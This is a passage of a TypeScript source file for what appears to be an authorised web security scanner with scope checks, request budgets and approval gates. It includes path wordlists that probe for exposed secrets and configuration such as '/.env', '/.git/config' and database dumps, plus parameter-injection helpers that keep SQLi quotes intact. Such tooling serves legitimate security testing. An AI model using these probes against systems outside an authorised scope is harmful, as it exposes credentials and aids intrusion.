import { createHash, createHmac, randomBytes, randomInt, randomUUID } from 'node:crypto'
import { matchesApprovedEndpointPattern } from './approval-judge.ts'
import { BrokerApprovalRequired, BrokerCircuitOpen, BrokerDenied } from './broker.ts'
import type { BrokerExchangeResult, BrokerHttpRequest, Grant, RequestBroker } from './broker.ts'
import type { CanaryBroker } from './canary-broker.ts'
import type { HttpMethod } from '../domain.ts'
import { containsDestructivePayload, universalParamLocations } from '../replay-spec.ts'
import type { CsrfBind, UniversalParamLocation } from '../replay-spec.ts'
import { loadSafeTemplates, selectSafeTemplates, selectTemplateIdsForCves } from '../templates/loader.ts'
import type { SafeTemplate, TemplateMatcher } from '../templates/loader.ts'
import type { Store } from './store.ts'

export const surfaceParamLocations = universalParamLocations
export type SurfaceParamLocation = UniversalParamLocation

// Shared limits & helpers

export const defaultSurfaceMaxRequests = 150
export const surfaceMaxRequestsCeiling = 300
export const surfaceMaxConcurrency = 2
export const maxWorkerPaths = 120
export const maxParamCandidates = 200
const probeBodyCap = 128 * 1024
const calibrationBodyKeep = 32 * 1024

export type StopReason = 'circuit_open' | 'aborted' | 'budget' | 'approval_required' | 'denied'

export type SurfaceWordlistName =
  | 'api-routes' | 'nextjs-routes' | 'graphql-endpoints' | 'swagger-openapi'
  | 'well-known' | 'debug-actuator' | 'backup-config'

export const surfaceWordlists: Record<SurfaceWordlistName, readonly string[]> = {
  'api-routes': [
    '/api', '/api/v1', '/api/v2', '/api/users', '/api/user', '/api/me', '/api/profile', '/api/account',
    '/api/accounts', '/api/admin', '/api/config', '/api/settings', '/api/health', '/api/status', '/api/version',
    '/api/projects', '/api/orgs', '/api/organizations', '/api/teams', '/api/invoices', '/api/orders',
    '/api/files', '/api/upload', '/api/search', '/api/export', '/api/webhooks', '/api/keys', '/api/tokens',
    '/api/auth/session', '/api/auth/me', '/v1', '/v2', '/rest', '/trpc', '/internal', '/admin',
  ],
  'nextjs-routes': [
    '/_next/data', '/_next/image', '/_next/static/chunks/main.js.map', '/_next/static/chunks/pages/_app.js',
    '/api/auth/providers', '/api/auth/csrf', '/api/auth/session', '/api/trpc', '/_next/webpack-hmr',
    '/__nextjs_original-stack-frame', '/api/revalidate', '/api/preview', '/api/draft', '/api/og',
    '/sitemap.xml', '/robots.txt', '/manifest.json', '/_vercel/insights/script.js',
  ],
  'graphql-endpoints': [
    '/graphql', '/api/graphql', '/graphql/v1', '/v1/graphql', '/query', '/gql', '/graphiql', '/playground',
    '/altair', '/graphql/console', '/api/gql', '/subscriptions',
  ],
  'swagger-openapi': [
    '/swagger.json', '/swagger.yaml', '/swagger-ui.html', '/swagger-ui/index.html', '/swagger/index.html',
    '/openapi.json', '/openapi.yaml', '/openapi', '/v2/api-docs', '/v3/api-docs', '/api-docs', '/api/docs',
    '/api/swagger.json', '/docs', '/redoc', '/api-json', '/api/openapi.json', '/documentation/json',
    '/.well-known/openapi',
  ],
  'well-known': [
    '/.well-known/security.txt', '/.well-known/openid-configuration', '/.well-known/oauth-authorization-server',
    '/.well-known/jwks.json', '/.well-known/assetlinks.json', '/.well-known/apple-app-site-association',
    '/.well-known/change-password', '/.well-known/host-meta', '/.well-known/webfinger', '/.well-known/mta-sts.txt',
    '/robots.txt', '/sitemap.xml', '/humans.txt', '/crossdomain.xml', '/clientaccesspolicy.xml',
  ],
  'debug-actuator': [
    '/actuator', '/actuator/health', '/actuator/env', '/actuator/mappings', '/actuator/beans', '/actuator/metrics',
    '/actuator/loggers', '/actuator/configprops', '/actuator/info', '/metrics', '/health', '/healthz', '/status',
    '/debug', '/debug/vars', '/debug/pprof/', '/server-status', '/server-info', '/nginx_status', '/_debug',
    '/__debug__/', '/console', '/phpinfo.php', '/info', '/trace', '/elmah.axd', '/telescope', '/horizon',
    '/_profiler', '/admin/health',
  ],
  'backup-config': [
    '/.env', '/.env.local', '/.env.production', '/.git/config', '/.git/HEAD', '/.gitignore', '/.svn/entries',
    '/.DS_Store', '/config.json', '/config.js', '/config.yml', '/config.yaml', '/appsettings.json', '/web.config',
    '/wp-config.php.bak', '/backup.zip', '/backup.sql', '/db.sql', '/dump.sql', '/database.sqlite',
    '/docker-compose.yml', '/Dockerfile', '/package.json', '/composer.json', '/.npmrc', '/.htaccess',
  ],
}

const commonParamWordlist: readonly string[] = [
  'id', 'user', 'user_id', 'uid', 'account', 'org', 'org_id', 'tenant', 'debug', 'test', 'admin', 'role', 'token',
  'key', 'api_key', 'redirect', 'redirect_uri', 'return', 'returnUrl', 'next', 'url', 'uri', 'callback', 'file',
  'path', 'page', 'limit', 'offset', 'sort', 'order', 'q', 'query', 'search', 'filter', 'format', 'lang', 'locale',
  'view', 'template', 'include', 'fields', 'expand', 'cursor', 'type', 'status', 'name', 'email', 'from', 'to',
  'host', 'domain', 'ref', 'source', 'mode', 'preview', 'draft', 'version', 'verbose', 'trace',
]

/**
 * Mask values that legitimately rotate between two requests to the same endpoint: request/trace
 * ids, CSRF nonces, ETags, ISO-8601 timestamps and epoch-ms values. Masking is deliberately
 * key- or shape-scoped (never a bare UUID) so resource identifiers still distinguish responses and
 * decoy rejection is unchanged.
 */
export function normalizeEphemeralNoise(body: string): string {
  if (!body) return body
  let out = body
  // Keyed ephemeral scalars (request/trace ids, nonces, ETag-ish values, server clocks).
  out = out.replace(
    /(["']?(?:[A-Za-z0-9_$-]*(?:request|trace|correlation|span)[_-]?id|[A-Za-z0-9_$-]*(?:csrf|xsrf|nonce)[A-Za-z0-9_$-]*|etag|server[_-]?time|request[_-]?time)["']?\s*[:=]\s*)("(?:[^"\\]|\\.)*"|'[^']*'|[^\s,;&}<]+)/gi,
    '$1"<ephemeral>"',
  )
  // ISO-8601 timestamps anywhere (a per-request clock value, not a resource identity).
  out = out.replace(/\b\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}(?:\.\d{1,9})?(?:Z|[+-]\d{2}:?\d{2})\b/g, '<ephemeral>')
  // Epoch milliseconds (>= 2001) are runtime clocks; smaller numbers stay meaningful.
  out = out.replace(/\b1[5-9]\d{11}\b|\b2\d{12}\b/g, '<ephemeral>')
  return out
}

/** Token-set Jaccard similarity of two response bodies (1 = identical). */
export function responseSimilarity(a: string, b: string): number {
  if (a === b) return 1
  const tok = (s: string) => new Set(normalizeEphemeralNoise(s).toLowerCase().split(/[^a-z0-9]+/).filter(Boolean).slice(0, 4000))
  const ta = tok(a)
  const tb = tok(b)
  if (ta.size === 0 && tb.size === 0) {
    const max = Math.max(a.length, b.length, 1)
    return Number((1 - Math.abs(a.length - b.length) / max).toFixed(4))
  }
  let inter = 0
  for (const t of ta) if (tb.has(t)) inter += 1
  const union = ta.size + tb.size - inter
  return union === 0 ? 1 : Number((inter / union).toFixed(4))
}

export function clampMaxRequests(requested?: number): number {
  if (requested === undefined || !Number.isFinite(requested)) return defaultSurfaceMaxRequests
  return Math.max(1, Math.min(Math.floor(requested), surfaceMaxRequestsCeiling))
}

function sha8(s: string): string {
  return createHash('sha256').update(s).digest('hex').slice(0, 8)
}

function randToken(len = 8): string {
  return randomBytes(len).toString('hex').slice(0, len)
}

function isPrime(n: number): boolean {
  if (n < 2) return false
  if (n % 2 === 0) return n === 2
  for (let i = 3; i * i <= n; i += 2) if (n % i === 0) return false
  return true
}

function randomPrime(min: number, max: number, exclude?: number): number {
  for (;;) {
    const c = randomInt(min, max) | 1
    if (c !== exclude && isPrime(c)) return c
  }
}

function isPrivateOrLoopbackHost(host: string): boolean {
  const h = host.toLowerCase().replace(/^\[|\]$/g, '')
  if (h === 'localhost' || h.endsWith('.localhost') || h === '::1' || h === '0.0.0.0') return true
  if (h === 'metadata.google.internal' || h.startsWith('fe80:') || /^fd[0-9a-f]{2}:/.test(h)) return true
  const m = /^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/.exec(h)
  if (!m) return false
  const a = Number(m[1])
  const b = Number(m[2])
  return a === 10 || a === 127 || a === 0 || (a === 169 && b === 254) || (a === 172 && b >= 16 && b <= 31) || (a === 192 && b === 168)
}

function safeProbePath(path: string): boolean {
  return path.startsWith('/') && !path.startsWith('//') && path.length <= 512 && !/[\r\n\0\\]/.test(path) && !containsDestructivePayload(path)
}

/** Reduce a redirect Location to a scheme+host+path base (drops per-request code/state parameters). */
function redirectBaseFromLocation(location: string): string | null {
  if (!location || /[\r\n\0]/.test(location)) return null
  try {
    const u = new URL(location, 'http://guardian.invalid')
    if (u.protocol !== 'http:' && u.protocol !== 'https:') return null
    if (!u.hostname) return null
    return `${u.protocol}//${u.host}${u.pathname || '/'}`
  } catch {
    return null
  }
}

function setQueryParam(pathAndQuery: string, name: string, value: string): string {
  const url = new URL(pathAndQuery, 'http://guardian.invalid')
  url.searchParams.set(name, value)
  return url.pathname + url.search
}

function setJsonPath(target: Record<string, unknown>, dotPath: string, value: unknown) {
  const parts = dotPath.split('.')
  let cur: Record<string, unknown> | unknown[] = target
  for (let i = 0; i < parts.length - 1; i += 1) {
    const part = parts[i]
    const nextIsIndex = /^\d{1,3}$/.test(parts[i + 1] ?? '')
    if (Array.isArray(cur)) {
      const index = /^\d{1,3}$/.test(part) ? Number(part) : 0
      const existing = cur[index]
      if (!existing || typeof existing !== 'object') cur[index] = nextIsIndex ? [] : {}
      cur = cur[index] as Record<string, unknown> | unknown[]
    } else {
      const existing = cur[part]
      if (!existing || typeof existing !== 'object') cur[part] = nextIsIndex ? [] : {}
      cur = cur[part] as Record<string, unknown> | unknown[]
    }
  }
  const last = parts[parts.length - 1]
  if (Array.isArray(cur)) {
    cur[/^\d{1,3}$/.test(last) ? Number(last) : 0] = value
  } else {
    cur[last] = value
  }
}

const forbiddenParamHeaders = /^(?:authorization|proxy-authorization|cookie|host|content-length|transfer-encoding|x-guardian-trace-id)$/i

export function escapeXmlText(value: string): string {
  // Escape &, <, > while intentionally preserving ' and " so SQLi quotes reach XML parsers intact.
  return value.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
}

export function escapeXmlAttr(value: string): string {
  return escapeXmlText(value).replace(/"/g, '&quot;').replace(/'/g, '&apos;')
}

export function appendCacheBuster(pathAndQuery: string, gcb: string): string {
  const url = new URL(pathAndQuery, 'http://guardian.invalid')
  url.searchParams.set('_gcb', gcb)
  return url.pathname + url.search
}

export interface UniversalInjectInput {
  pathAndQuery: string
  param: string
  paramLocation: SurfaceParamLocation
  value: string | number | boolean | Record<string, unknown>
  method?: 'GET' | 'POST' | 'PUT' | 'PATCH'
  headers?: Record<string, string>
  jsonBody?: Record<string, unknown>
  formBody?: Record<string, string>
  xmlTemplate?: string
  graphqlQuery?: string
  session?: string
  csrfBind?: CsrfBind
  runId?: string
  assignmentId?: string
}

export function injectUniversalParam(input: UniversalInjectInput): InjectedRequest {
  const param = input.param || 'q'
  const location = input.paramLocation
  const strVal = typeof input.value === 'string'
    ? input.value
    : (typeof input.value === 'number' || typeof input.value === 'boolean' ? String(input.value) : JSON.stringify(input.value))
  const baseExtras: Partial<InjectedRequest> = {
    ...(input.session ? { session: input.session } : {}),
    ...(input.csrfBind !== undefined ? { csrfBind: input.csrfBind } : {}),
    ...(input.runId ? { runId: input.runId } : {}),
    ...(input.assignmentId ? { assignmentId: input.assignmentId } : {}),
  }

  if (location === 'json') {
    const body: Record<string, unknown> = structuredClone(input.jsonBody ?? {})
    setJsonPath(body, param, input.value)
    return {
      method: input.method && input.method !== 'GET' ? input.method : 'POST',
      pathAndQuery: input.pathAndQuery,
      body: JSON.stringify(body),
      headers: { 'Content-Type': 'application/json', ...(input.headers ?? {}) },
      ...baseExtras,
    }
  }

  if (location === 'form') {
    const params = new URLSearchParams()
    if (input.formBody) {
      for (const [k, v] of Object.entries(input.formBody)) params.set(k, v)
    } else if (input.jsonBody) {
      for (const [k, v] of Object.entries(input.jsonBody)) {
        if (v !== undefined && v !== null) {
          params.set(k, typeof v === 'object' ? JSON.stringify(v) : String(v))
        }
      }
    }
    if (typeof input.value === 'string' || typeof input.value === 'number' || typeof input.value === 'boolean') {
      params.set(param, String(input.value))
    } else {
      for (const [op, v] of Object.entries(input.value)) {
        params.set(`${param}[${op}]`, String(v))
      }
    }
    return {
      method: input.method && input.method !== 'GET' ? input.method : 'POST',
      pathAndQuery: input.pathAndQuery,
      body: params.toString(),
      headers: { 'Content-Type': 'application/x-www-form-urlencoded', ...(input.headers ?? {}) },
      ...baseExtras,
    }
  }

  if (location === 'path') {
    const qIdx = input.pathAndQuery.indexOf('?')
    const rawPath = qIdx >= 0 ? input.pathAndQuery.slice(0, qIdx) : input.pathAndQuery
    const qs = qIdx >= 0 ? input.pathAndQuery.slice(qIdx) : ''
    const encoded = encodeURIComponent(strVal)
    const tokenPatterns = [`{{val}}`, `{{${param}}}`, `{${param}}`, `:${param}`]
    let nextPath = rawPath
    let replaced = false
    for (const pat of tokenPatterns) {
      if (nextPath.includes(pat)) {
        nextPath = nextPath.split(pat).join(encoded)
        replaced = true
      }
    }
    if (!replaced) {
      nextPath = `${nextPath.replace(/\/+$/, '')}/${encoded}`
    }
    return {
      method: input.method ?? 'GET',
      pathAndQuery: `${nextPath}${qs}`,
      headers: input.headers,
      ...baseExtras,
    }
  }

  if (location === 'header') {
    if (forbiddenParamHeaders.test(param) || /[\r\n\0]/.test(param) || /[\r\n\0]/.test(strVal)) {
      throw new BrokerDenied(`Header parameter "${param}" is forbidden or contains invalid characters.`)
    }
    return {
      method: input.method ?? 'GET',
      pathAndQuery: input.pathAndQuery,
      headers: { ...(input.headers ?? {}), [param]: strVal },
      ...baseExtras,
    }
  }

  if (location === 'xml') {
    const safeTag = param.replace(/[^A-Za-z0-9_:-]/g, '') || 'param'
    let xmlBody: string
    if (input.xmlTemplate) {
      xmlBody = input.xmlTemplate.replace(/(=["'])\{\{(?:val|[A-Za-z0-9_.-]+)\}\}/g, (_m, prefix: string) =>
        `${prefix}${escapeXmlAttr(strVal)}`,
      )
      xmlBody = xmlBody
        .replaceAll('{{val}}', escapeXmlText(strVal))
        .replaceAll(`{{${param}}}`, escapeXmlText(strVal))
    } else {
      xmlBody = `<?xml version="1.0" encoding="UTF-8"?><request><${safeTag}>${escapeXmlText(strVal)}</${safeTag}></request>`
    }
    const headers: Record<string, string> = { ...(input.headers ?? {}) }
    if (!Object.keys(headers).some(k => k.toLowerCase() === 'content-type')) {
      headers['Content-Type'] = 'application/xml'
    }
    return {
      method: input.method && input.method !== 'GET' ? input.method : 'POST',
      pathAndQuery: input.pathAndQuery,
      body: xmlBody,
      headers,
      ...baseExtras,
    }
  }

  if (location === 'graphql_var') {
    const baseJson = structuredClone(input.jsonBody ?? {})
    const variables = (
      baseJson.variables && typeof baseJson.variables === 'object' && !Array.isArray(baseJson.variables)
        ? baseJson.variables
        : {}
    ) as Record<string, unknown>
    setJsonPath(variables, param, input.value)
    const rootVar = param.split('.')[0].replace(/[^A-Za-z0-9_]/g, '') || 'q'
    const query = input.graphqlQuery ??
      (typeof baseJson.query === 'string' && baseJson.query.trim()
        ? baseJson.query
        : `query($${rootVar}: String) { __typename }`)
    return {
      method: input.method && input.method !== 'GET' ? input.method : 'POST',
      pathAndQuery: input.pathAndQuery,
      body: JSON.stringify({ ...baseJson, query, variables }),
      headers: { 'Content-Type': 'application/json', ...(input.headers ?? {}) },
      ...baseExtras,
    }
  }

  // Default: query
  if (typeof input.value !== 'string') {
    const url = new URL(input.pathAndQuery, 'http://guardian.invalid')
    for (const [op, v] of Object.entries(input.value)) url.searchParams.set(`${param}[${op}]`, String(v))
    return {
      method: input.method ?? 'GET',
      pathAndQuery: url.pathname + url.search,
      headers: input.headers,
      ...(input.method === 'POST' && input.jsonBody ? { body: JSON.stringify(input.jsonBody) } : {}),
      ...baseExtras,
    }
  }
  return {
    method: input.method ?? 'GET',
    pathAndQuery: setQueryParam(input.pathAndQuery, param, input.value),
    headers: input.headers,
    ...(input.method === 'POST' && input.jsonBody ? { body: JSON.stringify(input.jsonBody) } : {}),
    ...baseExtras,
  }
}

// Broker-routed request runner: request budget, 2-lane concurrency, circuit-breaker / abort stop.

class StopProbe extends Error {
  readonly reason: StopReason
  constructor(reason: StopReason) {
    super(`probe stopped: ${reason}`)
    this.name = 'StopProbe'
    this.reason = reason
  }
}

type SendResult =
  | { ok: true; ex: BrokerExchangeResult }
  | { ok: false; kind: 'denied' | 'approval' | 'error'; message: string }

class ProbeRunner {
  sent = 0
  denied = 0
  stopReason: StopReason | null = null
  readonly staged: BrokerExchangeResult[] = []
  readonly exchangeIds: string[] = []

  readonly broker: RequestBroker
  readonly grant: Grant
  readonly signal: AbortSignal
  readonly max: number
  readonly persona?: string
  readonly onExchange?: (exchange: BrokerExchangeResult) => string | void

  constructor(
    broker: RequestBroker,
    grant: Grant,
    signal: AbortSignal,
    max: number,
    persona?: string,
    onExchange?: (exchange: BrokerExchangeResult) => string | void,
  ) {
    this.broker = broker
    this.grant = grant
    this.signal = signal
    this.max = max
    this.persona = persona
    this.onExchange = onExchange
  }

  stop(reason: StopReason): never {
    this.stopReason ??= reason
    throw new StopProbe(this.stopReason)
  }

  async send(req: BrokerHttpRequest): Promise<SendResult> {
    // The approved baseline root (`GET /`) is recorded once and reused. Differential probes must
    // never re-fetch it, otherwise crash-resume duplicates the baseline request.
    if ((req.method === 'GET' || req.method === 'HEAD') && (req.pathAndQuery.split('?')[0] || '/') === '/') {
      return { ok: false, kind: 'denied', message: 'Baseline site root is not re-probed by differential probes.' }
    }
    if (this.stopReason) throw new StopProbe(this.stopReason)
    if (this.signal.aborted) this.stop('aborted')
    if (this.sent >= this.max) this.stop('budget')
    this.sent += 1
    try {
      const ex = await this.broker.executeHttp({
        followRedirects: false,
        maxBodyBytes: probeBodyCap,
        persona: this.persona,
        ...req,
      }, this.grant, this.signal)
      return { ok: true, ex }
    } catch (err) {
      if (err instanceof BrokerCircuitOpen) this.stop('circuit_open')
      if (this.signal.aborted) this.stop('aborted')
      if (err instanceof BrokerApprovalRequired) return { ok: false, kind: 'approval', message: err.message }
      if (err instanceof BrokerDenied) {
        this.denied += 1
        return { ok: false, kind: 'denied', message: err.message }
      }
      return { ok: false, kind: 'error', message: err instanceof Error ? err.message : String(err) }
    }
  }

  stage(ex: BrokerExchangeResult): string | undefined {
    this.staged.push(ex)
    const id = this.onExchange?.(ex)
    if (typeof id === 'string' && id) {
      this.exchangeIds.push(id)
      return id
    }
    return undefined
  }

  /** Runs fn over items with at most 2 requests in flight; stops cleanly on StopProbe. */
  async pool<T>(items: readonly T[], fn: (item: T) => Promise<void>): Promise<void> {
    let next = 0
    const lane = async () => {
      while (!this.stopReason) {
        const i = next
        next += 1
        if (i >= items.length) return
        try {
          await fn(items[i])
        } catch (err) {
          if (err instanceof StopProbe) return
          throw err
        }
      }
    }
    await Promise.all(Array.from({ length: surfaceMaxConcurrency }, lane))
  }
}

function preflight(origin: string, grant: Grant): string {
  if ((grant.tier ?? 1) === 0) throw new BrokerDenied('Active discovery is disabled in Tier 0 (offline prepared mode).')
  let normalized: string
  try {
    normalized = new URL(origin).origin
  } catch {
    throw new BrokerDenied('Discovery origin is malformed.')
  }
  if (!grant.canRead(normalized)) {
    grant.audit('denied', normalized)
    throw new BrokerDenied('Discovery origin is outside the current assignment scope.')
  }
  return normalized
}

// SPA catch-all / baseline calibration

export interface SurfaceCalibration {
  ok: boolean
  statuses: number[]
  minBytes: number
  maxBytes: number
  shas: string[]
  bodies: string[]
  redirectPattern: string | null
  spaCatchall: boolean
  signature: string
  paths: string[]
}

const emptyCalibration: SurfaceCalibration = {
  ok: false, statuses: [], minBytes: 0, maxBytes: 0, shas: [], bodies: [], redirectPattern: null,
  spaCatchall: false, signature: 'uncalibrated', paths: [],
}

function normalizeLocation(location: string | undefined, probePath: string): string | null {
  if (!location) return null
  const bare = probePath.split('?')[0]
  return location.split(bare).join('{p}').split(encodeURIComponent(bare)).join('{p}').replace(/^https?:\/\/[^/]+/i, '')
}

async function calibrateOrigin(runner: ProbeRunner, origin: string): Promise<SurfaceCalibration> {
  const paths = [`/.guardian-cal-${randomUUID()}`, `/.guardian-cal-${randomUUID()}`]
  const exchanges: BrokerExchangeResult[] = []
  for (const path of paths) {
    const res = await runner.send({ origin, method: 'GET', pathAndQuery: path })
    if (res.ok) {
      exchanges.push(res.ex)
      runner.stage(res.ex)
    }
  }
  if (exchanges.length === 0) return { ...emptyCalibration, paths }
  const statuses = [...new Set(exchanges.map(e => e.status))]
  const sizes = exchanges.map(e => e.bodyBytes)
  const redirectPattern = exchanges.some(e => e.status >= 300 && e.status < 400)
    ? normalizeLocation(exchanges[0].respHeaders.location, paths[0])
    : null
  const spaCatchall = exchanges.every(e => e.status === 200 && /html/i.test(e.mediaType))
  const min = Math.min(...sizes)
  const max = Math.max(...sizes)
  return {
    ok: true,
    statuses,
    minBytes: min,
    maxBytes: max,
    shas: exchanges.map(e => e.bodySha256),
    bodies: exchanges.map(e => e.body.slice(0, calibrationBodyKeep)),
    redirectPattern,
    spaCatchall,
    signature: `${statuses.join('/')}:${min}-${max}:${sha8(exchanges[0].body)}${spaCatchall ? ':spa' : ''}`,
    paths,
  }
}

function matchesBaseline(cal: SurfaceCalibration, ex: BrokerExchangeResult, probePath: string): boolean {
  if (!cal.ok || !cal.statuses.includes(ex.status)) return false
  if (ex.status >= 300 && ex.status < 400 && cal.redirectPattern !== null) {
    return normalizeLocation(ex.respHeaders.location, probePath) === cal.redirectPattern
  }
  if (cal.shas.includes(ex.bodySha256)) return true
  const lo = cal.minBytes * 0.9 - 64
  const hi = cal.maxBytes * 1.1 + 64
  if (ex.bodyBytes < lo || ex.bodyBytes > hi) return false
  const body = ex.body.slice(0, calibrationBodyKeep)
  return cal.bodies.some(b => responseSimilarity(b, body) >= 0.85)
}

type Classification = 'exists' | 'protected' | 'redirect' | 'method_not_allowed' | 'client_error' | 'server_error'

function classify(status: number): Classification {
  if (status >= 500) return 'server_error'
  if (status === 401 || status === 403) return 'protected'
  if (status === 405) return 'method_not_allowed'
  if (status >= 300 && status < 400) return 'redirect'
  if (status >= 400) return 'client_error'
  return 'exists'
}

// probe_surface

export interface ProbeSurfaceRequest {
  origin: string
  mode: 'paths' | 'params' | 'methods'
  wordlists?: SurfaceWordlistName[]
  paths?: string[]
  basePath?: string
  params?: string[]
  paramLocation?: SurfaceParamLocation
  batchSize?: number
  methods?: HttpMethod[]
  persona?: string
  session?: string
  maxRequests?: number
  onExchange?: (exchange: BrokerExchangeResult) => string | void
}

export interface SurfaceAnomaly {
  kind: 'path' | 'param' | 'method'
  path: string
  method: string
  status: number
  classification: Classification | 'reflected_param' | 'param_effect' | 'method_accepted' | 'allow_header'
  param?: string
  mediaType?: string
  bodyBytes?: number
  allow?: string
  approvalRequired?: boolean
  reasons: string[]
  bodyPreview?: string
  exchangeId?: string
}

export interface ProbeSurfaceResult {
  mode: ProbeSurfaceRequest['mode']
  origin: string
  requestsSent: number
  maxRequests: number
  candidates: number
  suppressedAsBaseline: number
  suppressedNotFound: number
  deniedRequests: number
  anomalies: SurfaceAnomaly[]
  calibration: SurfaceCalibration | null
  baselineSignature: string
  stoppedReason: StopReason | null
  exchangeIds: string[]
  notes: string[]
  durationMs: number
}

function previewOf(ex: BrokerExchangeResult): string {
  return ex.bodyPreview.slice(0, 300)
}

export async function probeSurface(
  req: ProbeSurfaceRequest,
  broker: RequestBroker,
  grant: Grant,
  signal: AbortSignal,
): Promise<ProbeSurfaceResult> {
  const started = Date.now()
  const origin = preflight(req.origin, grant)
  const max = clampMaxRequests(req.maxRequests)
  const runner = new ProbeRunner(broker, grant, signal, max, req.persona, req.onExchange)
  const anomalies: SurfaceAnomaly[] = []
  const notes: string[] = []
  let calibration: SurfaceCalibration | null = null
  let candidates = 0
  let suppressedAsBaseline = 0
  let suppressedNotFound = 0
  let baselineSignature = 'n/a'

  // The baseline root is never a parameter-discovery target; probing it duplicates the recorded
  // baseline request (and breaks crash-recovery no-duplication).
  if (req.mode === 'params' && ((req.basePath ?? '/').split('?')[0] || '/') === '/') {
    return {
      mode: req.mode, origin, requestsSent: 0, maxRequests: max, candidates: 0,
      suppressedAsBaseline: 0, suppressedNotFound: 0, deniedRequests: 0,
      anomalies: [], calibration: null, baselineSignature: 'n/a', stoppedReason: null,
      exchangeIds: [], notes: ['Skipped parameter probing of the baseline site root.'],
      durationMs: Date.now() - started,
    }
  }

  try {
    if (req.mode === 'paths') {
      const wordlists = req.wordlists?.length ? req.wordlists : (Object.keys(surfaceWordlists) as SurfaceWordlistName[])
      const supplied = (req.paths ?? []).slice(0, maxWorkerPaths).filter(safeProbePath)
      if ((req.paths ?? []).length > maxWorkerPaths) notes.push(`Only the first ${maxWorkerPaths} worker paths were used.`)
      const merged: string[] = [...supplied]
      for (const name of wordlists) {
        const list = surfaceWordlists[name]
        if (list) merged.push(...list)
      }
      const candidateList = [...new Set(merged)].filter(p => (p.split('?')[0] || '/') !== '/').slice(0, Math.max(0, max - 2))
      candidates = candidateList.length

      const cal = await calibrateOrigin(runner, origin)
      calibration = cal
      baselineSignature = cal.signature
      if (!cal.ok) notes.push('Calibration failed; only status-based suppression is active.')

      await runner.pool(candidateList, async path => {
        const res = await runner.send({ origin, method: 'GET', pathAndQuery: path })
        if (!res.ok) return
        const ex = res.ex
        if (matchesBaseline(cal, ex, path)) { suppressedAsBaseline += 1; return }
        if (ex.status === 404 || ex.status === 410) { suppressedNotFound += 1; return }
        anomalies.push({
          kind: 'path', path, method: 'GET', status: ex.status, classification: classify(ex.status),
          mediaType: ex.mediaType, bodyBytes: ex.bodyBytes,
          reasons: [`status ${ex.status} differs from calibrated catch-all (${cal.signature})`],
          bodyPreview: previewOf(ex), exchangeId: runner.stage(ex),
        })
      })
    } else if (req.mode === 'params') {
      const basePath = req.basePath ?? '/'
      if (!safeProbePath(basePath.split('?')[0].replace(/\{\{[a-zA-Z0-9_]+\}\}/g, 'x'))) throw new BrokerDenied('basePath is invalid.')
      const location: SurfaceParamLocation = req.paramLocation ?? 'query'
      const names = [...new Set((req.params?.length ? req.params : commonParamWordlist)
        .filter(n => /^[A-Za-z0-9_.\-[\]]{1,64}$/.test(n)))].slice(0, maxParamCandidates)
      candidates = names.length
      const batchSize = Math.max(10, Math.min(req.batchSize ?? 25, 25))
      const method: HttpMethod = (location === 'json' || location === 'form' || location === 'xml' || location === 'graphql_var') ? 'POST' : 'GET'

      const values = new Map<string, string>(names.map(n => [n, `gv${randToken(8)}`]))
      const build = (subset: readonly string[]): BrokerHttpRequest => {
        const sessionExtras = req.session ? { session: req.session } : {}
        if (location === 'json') {
          const body: Record<string, unknown> = {}
          for (const n of subset) body[n] = values.get(n)
          return { origin, method, pathAndQuery: basePath, body: JSON.stringify(body), headers: { 'Content-Type': 'application/json' }, ...sessionExtras }
        }
        if (location === 'form') {
          const sp = new URLSearchParams()
          for (const n of subset) sp.set(n, values.get(n)!)
          return { origin, method, pathAndQuery: basePath, body: sp.toString(), headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, ...sessionExtras }
        }
        if (location === 'header') {
          const headers: Record<string, string> = {}
          for (const n of subset) {
            if (!forbiddenParamHeaders.test(n) && !/[\r\n\0]/.test(n)) headers[n] = values.get(n)!
          }
          return { origin, method, pathAndQuery: basePath, headers, ...sessionExtras }
        }
        if (location === 'xml') {
          const inner = subset.map(n => {
            const safeTag = n.replace(/[^A-Za-z0-9_:-]/g, '') || 'param'
            return `<${safeTag}>${escapeXmlText(values.get(n)!)}</${safeTag}>`
          }).join('')
          return { origin, method, pathAndQuery: basePath, body: `<?xml version="1.0" encoding="UTF-8"?><request>${inner}</request>`, headers: { 'Content-Type': 'application/xml' }, ...sessionExtras }
        }
        if (location === 'graphql_var') {
          const variables: Record<string, unknown> = {}
          for (const n of subset) variables[n] = values.get(n)
          return { origin, method, pathAndQuery: basePath, body: JSON.stringify({ query: 'query{__typename}', variables }), headers: { 'Content-Type': 'application/json' }, ...sessionExtras }
        }
        if (location === 'path') {
          const seg = subset.map(n => encodeURIComponent(values.get(n)!)).join('/')
          const qIdx = basePath.indexOf('?')
          const rawP = qIdx >= 0 ? basePath.slice(0, qIdx) : basePath
          const qs = qIdx >= 0 ? basePath.slice(qIdx) : ''
          const nextP = rawP.includes('{{val}}')
            ? rawP.replaceAll('{{val}}', seg || 'baseline')
            : (seg ? `${rawP.replace(/\/+$/, '')}/${seg}` : rawP)
          return { origin, method, pathAndQuery: `${nextP}${qs}`, ...sessionExtras }
        }
        let pq = basePath
        for (const n of subset) pq = setQueryParam(pq, n, values.get(n)!)
        return { origin, method, pathAndQuery: pq, ...sessionExtras }
      }

      const baseA = await runner.send(build([]))
      if (!baseA.ok) throw new StopProbe((runner.stopReason ??= baseA.kind === 'approval' ? 'approval_required' : 'denied'))
      const baseB = await runner.send(build([]))
      const controlName = `gcal${randToken(6)}`
      values.set(controlName, `gv${randToken(8)}`)
      const unknownControl = await runner.send(build([controlName]))
      if (!baseB.ok || !unknownControl.ok) throw new BrokerDenied('Baseline requests failed.')
      runner.stage(baseA.ex)
      const deterministic = baseA.ex.bodySha256 === baseB.ex.bodySha256
      const noise = deterministic ? 1 : responseSimilarity(baseA.ex.body, baseB.ex.body)
      const echoesQuery = unknownControl.ex.status !== baseA.ex.status ||
        (unknownControl.ex.bodySha256 !== baseA.ex.bodySha256 &&
          responseSimilarity(baseA.ex.body, unknownControl.ex.body) < Math.min(noise, 0.995))
      if (echoesQuery) notes.push('Endpoint response changes for unknown parameters (query echo); body-diff signals suppressed, status changes still count.')
      const reference = echoesQuery ? baseA.ex : unknownControl.ex
      baselineSignature = `${reference.status}:${reference.bodyBytes}:${sha8(reference.body)}${deterministic ? '' : ':dynamic'}`

      const changed = (ex: BrokerExchangeResult): boolean => {
        if (ex.status !== reference.status) return true
